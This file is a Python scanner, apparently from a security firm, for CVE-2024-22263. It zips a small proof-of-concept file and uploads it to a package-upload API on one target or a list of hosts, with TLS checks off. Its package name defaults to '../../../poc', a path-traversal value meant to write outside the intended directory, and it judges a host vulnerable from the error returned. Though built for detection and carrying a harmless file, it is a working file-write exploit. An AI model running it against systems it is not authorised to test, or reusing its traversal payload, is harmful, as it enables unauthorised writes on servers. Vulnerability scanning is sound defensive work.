import argparse
import requests
import json
import zipfile
import os

def logo():
    logo = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗╚════██╗╚════██╗██╔════╝ ╚════██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝ █████╔╝ █████╔╝███████╗  █████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══██╗ ╚═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗███████╗███████╗╚██████╔╝██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ 
                                                                                                             
                                        By: SecureLayer7 (Zeyad Azima)
                            https://github.com/securelayer7/CVE-2024-22263_Scanner
    """
    print(logo)
    print("")
    print("")

def createPocFile(target, port):
    try:
        with open('poc.txt', 'w') as f:
            f.write(f"Target: {target}\nPort: {port}\n")
        print("[+] POC file created successfully.")
    except Exception as e:
        print(f"[-] Error creating POC file: {e}")

def zipPocFile():
    try:
        with zipfile.ZipFile('poc.zip', 'w') as zipf:
            zipf.write('poc.txt', compress_type=zipfile.ZIP_DEFLATED)
        print("[+] POC file zipped successfully.")
    except Exception as e:
        print(f"[-] Error creating ZIP file: {e}")

def zipToByteArray(zipFilePath):
    try:
        with open(zipFilePath, 'rb') as zipFile:
            print("[+] ZIP file converted to byte array.")
            return list(zipFile.read())
    except FileNotFoundError:
        print(f"[-] ZIP file not found: {zipFilePath}")
        return None
    except Exception as e:
        print(f"[-] Error reading ZIP file: {e}")
        return None

def uploadPackage(url, repoName, packageName, version, packageFileAsBytes):
    uploadRequest = {
        "repoName": repoName,
        "name": packageName,
        "version": version,
        "extension": "zip",
        "packageFileAsBytes": packageFileAsBytes
    }
    
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(uploadRequest), timeout=10, verify=False)
        return response, uploadRequest
    except requests.exceptions.RequestException as e:
        print(f"[-] Error sending request to {url}: {e}")
        return None, None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None, None

if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(description='Upload a package to the server.')
    parser.add_argument('-t', '--target', type=str, help='The target to scan (e.g., http://192.168.1.1).')
    parser.add_argument('-p', '--port', type=int, default=80, help='The port on the target (default: 80).')
    parser.add_argument('-r', '--repoName', type=str, default="local", help='The repository name (default: local).')
    parser.add_argument('-n', '--packageName', type=str, default="../../../poc", help='The name of the package (default: ../../../poc).')
    parser.add_argument('-v', '--version', type=str, default="1.0.0", help='The version of the package (default: 1.0.0).')
    parser.add_argument('-f', '--file', type=str, help='A file containing a list of targets to scan in the format "http://target,port".')

    args = parser.parse_args()

    targets = []
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip().split(',') for line in f.readlines()]
            print("[+] Targets loaded from file.")
        except FileNotFoundError:
            print(f"[-] File not found: {args.file}")
        except Exception as e:
            print(f"[-] Error reading file {args.file}: {e}")
    elif args.target:
        targets = [(args.target, args.port)]
    else:
        print("[-] Please provide either a target with -t or a file with targets using -f.")
    
    for target, port in targets:
        createPocFile(target, port)
        zipPocFile()
        packageFileAsBytes = zipToByteArray('poc.zip')
        if packageFileAsBytes is None:
            continue
        
        url = f"{target}:{port}/api/package/upload"
        response, requestBody = uploadPackage(url, args.repoName, args.packageName, args.version, packageFileAsBytes)
        
        if response is None:
            continue
        
        try:
            if response.status_code == 500 and "Package is expected to be unpacked, but it doesn't exist" in response.text:
                print(f"[+] Target {target} is vulnerable.")
            else:
                print(f"[-] Target {target} is not vulnerable.")
                print(f"[-] Status Code: {response.status_code}")
                print(f"[-] Response Body: {response.text}")
                print(f"[-] Request Body: {json.dumps(requestBody, indent=4)}")
        except Exception as e:
            print(f"[-] Error analyzing response from {url}: {e}")
    
    try:
        os.remove('poc.txt')
        os.remove('poc.zip')
        print("[+] Cleanup successful.")
        print("")
        print("")
    except Exception as e:
        print(f"[-] Error cleaning up files: {e}")
        print("")
        print("")

